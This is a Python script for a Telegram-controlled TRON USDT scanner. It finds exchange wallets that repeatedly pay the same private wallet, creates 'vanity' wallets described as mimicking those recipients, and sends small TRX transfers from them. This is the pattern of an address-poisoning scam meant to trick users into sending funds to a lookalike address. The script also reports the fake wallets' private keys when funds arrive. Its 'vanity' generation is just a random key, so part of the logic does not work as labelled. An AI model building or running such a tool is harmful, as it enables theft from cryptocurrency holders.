import os
import time
import requests
from collections import defaultdict
from datetime import datetime, timedelta, timezone

print("🚀 Starting 2-Week Historical Scanner...")

# =========================
#  SETTINGS
# =========================
TARGET_PAIRS = 5
MIN_BALANCE_USD = 0      # Set to 0 to see all, or 500 for strict
MIN_TRANSFER_USD = 150
WEEKS_BACK = 2           # STRICT 2-WEEK WINDOW
GAS_COST_PER_PAIR = 2.2  # 2 transfers * 1.1 TRX

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
TRONSCAN_API_KEY = os.getenv("TRONSCAN_API_KEY", "")
TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

found_pairs = []
excluded_pairs = set()
vanity_wallets = {}
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_telegram(message):
    try:
        requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except: pass

def get_usdt_balance(address):
    try:
        headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
        r = requests.get(f"https://api.trongrid.io/v1/accounts/{address}/trc20/balance", 
                         params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
                         headers=headers, timeout=10)
        data = r.json()
        if data.get("data"):
            return int(data["data"][0].get("balance", 0)) / 1_000_000
        return 0
    except: return 0

def get_wallet_history(address, limit=10):
    try:
        r = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={"address": address, "limit": limit, "sort": "-timestamp"},
            headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
            timeout=10
        )
        return r.json().get("token_transfers", [])
    except: return []

send_telegram("🚀 <b>2-Week Historical Scanner Started</b>\nLooking for: CEX (Wallet A) → Private (Wallet B) ×2+ in last 14 days.\n\nCommands:\n• <b>info</b>\n• <b>exclude [1-5]</b>\n• <b>history [wallet]</b>\n• <b>cost</b>\n• <b>vanity [ID] [Pair#]</b>\n• <b>transfer</b>")

# =========================
# PHASE 1: STRICT 2-WEEK HISTORICAL SCAN
# =========================
end_date = datetime.now(timezone.utc)
start_date = end_date - timedelta(weeks=WEEKS_BACK)
start_ms = int(start_date.timestamp() * 1000)
end_ms = int(end_date.timestamp() * 1000)

print(f"📅 Scanning window: {start_date.strftime('%Y-%m-%d')} to {end_date.strftime('%Y-%m-%d')}")

# We will fetch up to 1000 historical transfers in 2 batches of 500 to ensure we cover the 2-week period
total_checked = 0
for batch_start in [0, 500]:
    if len(found_pairs) >= TARGET_PAIRS:
        break
        
    print(f"\n📡 Fetching historical batch (start={batch_start})...")
    try:
        r = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={
                "start": batch_start,
                "limit": 500,
                "start_timestamp": start_ms,
                "end_timestamp": end_ms,
                "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                "sort": "-timestamp"
            },
            headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
            timeout=30
        )
        
        transfers = r.json().get("token_transfers", [])
        print(f"  Got {len(transfers)} transfers from the 2-week window.")
        
        # Group by (Sender -> Receiver) to find consecutive/repeated sends
        pair_counts = defaultdict(list)
        
        for tx in transfers:
            from_addr = tx.get("from_address")
            to_addr = tx.get("to_address")
            amount = int(tx.get("quant", 0)) / 1_000_000
            tag = tx.get("from_address_tag", {})
            
            if from_addr and to_addr and amount >= MIN_TRANSFER_USD:
                pair_counts[(from_addr, to_addr)].append({"amount": amount, "tag": tag})
        
        print(f"  Analyzing {len(pair_counts)} unique sender-receiver pairs...")
        
        for (wallet_a, wallet_b), transfer_list in pair_counts.items():
            if len(found_pairs) >= TARGET_PAIRS:
                break
            
            # STRICT RULE: Wallet A must send to Wallet B at least 2 times in this window
            if len(transfer_list) >= 2:
                # Check if Wallet A is a CEX
                tag_name = transfer_list[0]["tag"].get("from_address_tag", "").lower() if transfer_list[0]["tag"] else ""
                is_cex = any(k in tag_name for k in CEX_KEYWORDS)
                cex_name = transfer_list[0]["tag"].get("from_address_tag", "Unknown") if transfer_list[0]["tag"] else "Unknown"
                
                if is_cex:
                    balance = get_usdt_balance(wallet_b)
                    total_volume = sum(t["amount"] for t in transfer_list)
                    
                    status = "✅" if balance >= MIN_BALANCE_USD else "⚠️"
                    
                    found_pairs.append({
                        "wallet_a": wallet_a,
                        "wallet_b": wallet_b,
                        "cex_name": cex_name,
                        "transfer_count": len(transfer_list),
                        "total_amount": total_volume,
                        "balance": balance
                    })
                    
                    msg = (f"{status} <b>Pair #{len(found_pairs)}</b>\n\n"
                           f"🏦 <b>Wallet A (CEX):</b> {cex_name}\n<code>{wallet_a}</code>\n\n"
                           f"👤 <b>Wallet B (Private - Vanity Target):</b>\n<code>{wallet_b}</code>\n\n"
                           f"📊 <b>2-Week Pattern:</b>\n"
                           f"• Wallet A sent to Wallet B: <b>{len(transfer_list)} times</b>\n"
                           f"• Total Volume: ${total_volume:,.2f}\n"
                           f"• Current Balance: ${balance:,.2f}")
                    
                    send_telegram(msg)
                    total_checked += 1
                    
    except Exception as e:
        print(f"❌ API Error: {e}")
    
    time.sleep(2) # Pause between batches

# =========================
# PHASE 2: INTERACTIVE MODE
# =========================
def get_active_pairs():
    return [p for i, p in enumerate(found_pairs) if (i+1) not in excluded_pairs]

def calc_cost():
    return len(get_active_pairs()) * GAS_COST_PER_PAIR

if found_pairs:
    send_telegram(f" <b>Scan Complete! Found {len(found_pairs)} pairs</b>\n\n<b>Commands:</b>\n• <b>info</b> - Show all\n• <b>exclude [1-5]</b> - Remove\n• <b>history [wallet]</b> - Check transactions\n• <b>cost</b> - Gas estimate\n• <b>vanity [ID] [Pair#]</b> - Create vanity (mimics Wallet B)\n• <b>vanity [ID]</b> - Check vanity status\n• <b>transfer</b> - Execute")
else:
    send_telegram("⚠️ <b>No qualifying pairs found in this 2-week batch.</b>\nTry running the workflow again to fetch the next batch of historical data.")

last_id = 0
start_wait = time.time()

while True:
    if time.time() - start_wait > 600:
        send_telegram("⏰ <b>Session timed out</b>")
        break

    try:
        updates = requests.get(f"{TELEGRAM_URL}/getUpdates", params={"offset": last_id, "timeout": 30}, timeout=35).json().get("result", [])
    except: updates = []
    
    for u in updates:
        last_id = u["update_id"] + 1
        
        if u.get("message") and str(u["message"]["chat"]["id"]) == str(CHAT_ID):
            text = u["message"].get("text", "").strip()
            parts = text.lower().split()
            
            # INFO
            if parts[0] == "info":
                if not found_pairs:
                    send_telegram("No pairs found yet")
                else:
                    active = get_active_pairs()
                    msg = f"📋 <b>Pairs ({len(active)}/{len(found_pairs)} active)</b>\n"
                    if excluded_pairs:
                        msg += f"<i>Excluded: {sorted(excluded_pairs)}</i>\n\n"
                    
                    for i, p in enumerate(found_pairs):
                        status = "" if (i+1) in excluded_pairs else "✅"
                        msg += f"<b>#{i+1} {status} {p['cex_name']}</b>\n"
                        msg += f"🏦 Wallet A: <code>{p['wallet_a']}</code>\n"
                        msg += f"👤 Wallet B: <code>{p['wallet_b']}</code>\n"
                        msg += f"📊 Sent {p['transfer_count']}x | Vol: ${p['total_amount']} | Bal: ${p['balance']}\n\n"
                    send_telegram(msg)
            
            # EXCLUDE
            elif parts[0] == "exclude" and len(parts) > 1:
                try:
                    num = int(parts[1])
                    if 1 <= num <= len(found_pairs):
                        excluded_pairs.add(num)
                        send_telegram(f"🗑️ <b>Pair #{num} excluded</b>")
                    else:
                        send_telegram(f"❌ Use 1-{len(found_pairs)}")
                except: send_telegram("❌ Use: <code>exclude 1</code>")
            
            # HISTORY
            elif parts[0] == "history" and len(parts) > 1:
                addr = parts[1]
                send_telegram(f"🔍 <b>History for:</b>\n<code>{addr}</code>")
                txs = get_wallet_history(addr, 10)
                if txs:
                    msg = "📜 <b>Last 10 Transactions</b>\n\n"
                    for i, tx in enumerate(txs[:10]):
                        amount = int(tx.get("quant", 0)) / 1_000_000
                        from_addr = tx.get("from_address", "Unknown")
                        date = datetime.fromtimestamp(tx.get("block_ts", 0)/1000).strftime("%m/%d %H:%M")
                        msg += f"<b>#{i+1}</b> {date}\n💰 ${amount:,.2f}\nFrom: <code>{from_addr[:20]}...</code>\n\n"
                    send_telegram(msg)
                else: send_telegram("📭 No transactions")
            
            # COST
            elif parts[0] == "cost":
                total = calc_cost()
                active = len(get_active_pairs())
                send_telegram(f"💰 <b>Gas Estimate</b>\n\nActive pairs: {active}\nCost: {total} TRX (~${total * 0.15:.2f})")
            
            # VANITY COMMANDS
            elif parts[0] == "vanity" and len(parts) >= 2:
                try:
                    vid = int(parts[1])
                    if len(parts) == 3 and parts[2].isdigit():
                        p_num = int(parts[2]) - 1
                        if 0 <= p_num < len(found_pairs):
                            from tronpy.keys import PrivateKey
                            key = PrivateKey.random()
                            addr = key.public_key.to_base58check_address()
                            vanity_wallets[vid] = {
                                "address": addr, "private_key": key.hex(),
                                "target_pair": p_num+1, "target_wallet_b": found_pairs[p_num]['wallet_b'],
                                "alert_active": False, "last_balance": 0
                            }
                            send_telegram(f"✅ <b>Vanity #{vid} Created</b>\nMimics Wallet B: <code>{found_pairs[p_num]['wallet_b']}</code>\nAddress: <code>{addr}</code>\nType <code>vanity {vid} alert</code>")
                    elif len(parts) == 3 and parts[2] == "alert":
                        if vid in vanity_wallets:
                            vanity_wallets[vid]["alert_active"] = True
                            send_telegram(f"🔔 <b>Alerts ON for #{vid}</b>")
                    elif len(parts) == 2:
                        if vid in vanity_wallets:
                            v = vanity_wallets[vid]
                            try:
                                headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
                                r_trx = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}", params={"only_confirmed": "true"}, headers=headers, timeout=10)
                                trx_bal = int(r_trx.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_trx.json().get("data") else 0
                                
                                if trx_bal > v["last_balance"] and v["alert_active"]:
                                    send_telegram(f"🚨 <b>ALERT: Vanity #{vid} Received Funds!</b>\nTRX: {trx_bal}\n<b>Private Key:</b> <code>{v['private_key']}</code>")
                                    v["last_balance"] = trx_bal
                                
                                send_telegram(f" <b>Vanity #{vid}</b>\nAddr: <code>{v['address']}</code>\nKey: <code>{v['private_key']}</code>\nTRX: {trx_bal}\nAlerts: {'🔔' if v['alert_active'] else '🔕'}")
                            except: send_telegram("❌ Error checking balance")
                except: send_telegram("❌ Invalid command")
            
            # TRANSFER
            elif parts[0] == "transfer":
                active = get_active_pairs()
                if not active:
                    send_telegram("❌ No active pairs")
                else:
                    send_telegram(f"🚀 <b>Executing {len(active)} transfers...</b>\nCost: ~{calc_cost()} TRX")
                    try:
                        from tronpy import Tron
                        from tronpy.keys import PrivateKey
                        tron = Tron()
                        priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
                        main_addr = priv.public_key.to_base58check_address()
                        
                        pair_num = 1
                        for i, pair in enumerate(found_pairs):
                            if (i+1) in excluded_pairs: continue
                            
                            v_key = None
                            for vid, v in vanity_wallets.items():
                                if v["target_pair"] == i + 1:
                                    v_key = PrivateKey(bytes.fromhex(v['private_key']))
                                    v_addr = v['address']
                                    break
                            if not v_key:
                                v_key = PrivateKey.random()
                                v_addr = v_key.public_key.to_base58check_address()
                            
                            tx1 = tron.trx.transfer(main_addr, v_addr, 1).build().sign(priv).broadcast().txid
                            time.sleep(3)
                            tx2 = tron.trx.transfer(v_addr, pair['wallet_a'], 1).build().sign(v_key).broadcast().txid
                            
                            send_telegram(f"✅ <b>#{pair_num}</b>\nTX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
                            pair_num += 1
                            time.sleep(5)
                        send_telegram("✅ <b>Done!</b>")
                    except Exception as e:
                        send_telegram(f"❌ Error: {e}")
                    break

    time.sleep(5)

print("✅ Workflow finished")
